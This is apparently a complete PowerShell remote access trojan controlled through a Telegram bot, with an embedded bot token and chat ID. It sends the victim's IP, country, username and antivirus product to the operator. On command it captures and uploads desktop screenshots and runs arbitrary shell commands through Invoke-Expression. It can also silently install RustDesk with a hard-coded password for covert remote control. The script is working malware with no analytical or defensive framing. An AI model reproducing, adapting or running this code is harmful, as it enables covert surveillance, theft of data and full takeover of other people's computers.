$botToken = "7319129301:AAGJeISBdsqDQ2Gn9mW37RKEUmDT-MnfUZo"
$authorizedChatId = 7730103423
$taskfolder = "$env:temp\9999"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Net.Http

function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save($path)
    $graphics.Dispose()
    $bmp.Dispose()
}

try {
    $public = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()
}
catch {
    try {
        $public = (Invoke-RestMethod -Uri "https://ifconfig.me/ip").Trim()
    }
    catch {
        $public = "Unknown"
    }
}

$country = (Invoke-RestMethod -Uri "http://ip-api.com/json/").country
if (-not $country) {
    $country = "Unknown"
}

$antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
if (-not $antivirus) {
    $antivirus = "No Antivirus Detected"
}

$username = $env:USERNAME

$timezone = (Get-TimeZone).Id

Add-Type @"
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO {
    public uint cbSize;
    public uint dwTime;
}
public class Win32Helper {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetLastInputTime() {
        LASTINPUTINFO info = new LASTINPUTINFO();
        info.cbSize = (uint)Marshal.SizeOf(info);
        if (!GetLastInputInfo(ref info)) return 0;
        return info.dwTime;
    }
}
"@

$systemInfoMessage = @"
[ $public ]
[ $country ]
[ $timezone ]
[ $username ] 
[ $antivirus ]
"@

$params = @{
    chat_id    = $authorizedChatId
    text       = "<pre>$systemInfoMessage</pre>"
    parse_mode = "HTML"
}
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params

$inactivityThreshold = 3600
$lastState = "Active"
$lastUpdateId = 0
$sendMessages = $true  

while ($true) {
    $lastInput = [Win32Helper]::GetLastInputTime()
    $currentTick = [Environment]::TickCount
    $idleTime = ($currentTick - $lastInput) / 1000

    if ($idleTime -ge $inactivityThreshold -and $lastState -eq "Active") {
        if ($sendMessages) {
            $message = "[ $username ]`n[ inactive ]`n[ $(Get-Date -Format 'h:mm tt') ]"
            $params = @{
                chat_id    = $authorizedChatId
                text       = "<pre>$message</pre>"
                parse_mode = "HTML"
            }
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
        }
        $lastState = "Inactive"
    }
    elseif ($idleTime -lt $inactivityThreshold -and $lastState -eq "Inactive") {
        if ($sendMessages) {
            $message = "[ $username ]`n[ active ]`n[ $(Get-Date -Format 'h:mm tt') ]"
            $params = @{
                chat_id    = $authorizedChatId
                text       = "<pre>$message</pre>"
                parse_mode = "HTML"
            }
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
        }
        $lastState = "Active"
    }

    $getUpdatesUrl = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId + 1)"
    try {
        $response = Invoke-RestMethod -Uri $getUpdatesUrl -Method Get
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                if ($update.message.chat.id -eq $authorizedChatId) {
                    $messageText = $update.message.text
                    
                    if ($messageText -match "^/mute\s+$username\s*$") {
                        $sendMessages = $false
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>Bot Muted.</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif ($messageText -match "^/unmute\s+$username\s*$") {
                        $sendMessages = $true
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>Bot Unmuted.</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif ($messageText -match "^/kill\s+$username\s*$") {
                        remove-item -path $taskfolder -recurse -force
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>Bot Killed</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif ($messageText -match "^/bot\s*$") {
                        $botMessage = "[ listening... ]`n[ $public ]`n[ $country ]`n[ $timezone ]`n[ $username ]"
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>$botMessage</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif (-not $sendMessages) {
                        continue
                    }
                    else {
                        if ($messageText -match "^/desktop\s+$username\s*$") {
                            $virtualScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                            $bounds = [Drawing.Rectangle]::FromLTRB(
                                $virtualScreen.Left, 
                                $virtualScreen.Top, 
                                $virtualScreen.Left + $virtualScreen.Width, 
                                $virtualScreen.Top + $virtualScreen.Height
                            )
                            $randomFileName = [System.IO.Path]::GetRandomFileName() + ".png"
                            $screenshotPath = Join-Path -Path $env:TEMP -ChildPath $randomFileName

                            try {
                                screenshot $bounds $screenshotPath
                                $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendPhoto"
                                $httpClient = New-Object System.Net.Http.HttpClient
                                $content = New-Object System.Net.Http.MultipartFormDataContent

                                $chatContent = New-Object System.Net.Http.StringContent($authorizedChatId.ToString())
                                $content.Add($chatContent, "chat_id")

                                $fileStream = [System.IO.File]::OpenRead($screenshotPath)
                                $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
                                $content.Add($fileContent, "photo", [System.IO.Path]::GetFileName($screenshotPath))

                                $response = $httpClient.PostAsync($telegramApiUrl, $content).Result
                                Write-Host "Screenshot sent successfully"
                            }
                            catch {
                                Write-Error "Screenshot error: $_"
                                $params = @{
                                    chat_id = $authorizedChatId
                                    text    = "Failed to capture/send screenshot: $($_.Exception.Message)"
                                }
                                Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                            }
                            finally {
                                if ($fileStream) { $fileStream.Dispose() }
                                if ($httpClient) { $httpClient.Dispose() }
                                if (Test-Path $screenshotPath) { Remove-Item -Path $screenshotPath -Force }
                            }
                        }
                        elseif ($messageText -match "^/terminal\s+$username\s*\[([\s\S]+)\]$") {
                            $commandToRun = $matches[1]
                            $output = try {
                                Invoke-Expression $commandToRun 2>&1 | Out-String
                            } catch {
                                "Error executing command: $_"
                            }
                            $output = $output.Trim()
                            if (-not $output) { $output = "(No output from command)" }
                            if ($output.Length -gt 4000) { $output = $output.Substring(0, 4000) + "`n...(truncated)" }
                            
                            $params = @{
                                chat_id    = $authorizedChatId
                                text       = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$([System.Net.WebUtility]::HtmlEncode($output))</pre>"
                                parse_mode = "HTML"
                            }
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                        }
                        elseif ($messageText -match "^/rustdesk\s+$username\s*$") {
                            try {
                                (New-Object -ComObject WScript.Shell).SendKeys([char]173)
                                Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.exe" -OutFile "$env:temp\rustdesk-1.3.8-x86_64.exe"
                                Push-Location "$env:temp"
                                .\rustdesk-1.3.8-x86_64.exe --silent-install
                                $rustdeskId = .\rustdesk-1.3.8-x86_64.exe --get-id | Select-String "^\d+$"
                                $path = "$env:APPDATA\RustDesk\config\RustDesk.toml"
                                (Get-Content $path) | ForEach-Object -Begin { $i=0 } -Process {
                                    $i++
                                    if ($i -eq 2) { "password = 'fuckrustdesk@A1'" }
                                    else { $_ }
                                } | Set-Content $path
                                Pop-Location
                                $output = "RustDesk installed successfully. RustDesk ID: $rustdeskId"
                            }
                            catch {
                                $output = "Error executing command: $($_.Exception.Message)"
                            }
                            $params = @{
                                chat_id    = $authorizedChatId
                                text       = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$output</pre>"
                                parse_mode = "HTML"
                            }
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                        }
                        elseif ($messageText -match "^/killrustdesk\s+$username\s*$") {
                            try {
                                Push-Location "$env:temp"
                                .\rustdesk-1.3.8-x86_64.exe --uninstall
                                Pop-Location
                                $output = "RustDesk uninstalled successfully."
                            }
                            catch {
                                $output = "Error executing command: $($_.Exception.Message)"
                            }
                            $params = @{
                                chat_id    = $authorizedChatId
                                text       = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$output</pre>"
                                parse_mode = "HTML"
                            }
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                        }
                    }
                }
            }
        }
    }
    catch {
        Write-Error "Update check error: $_"
    }
    
    Start-Sleep -Seconds 1
}
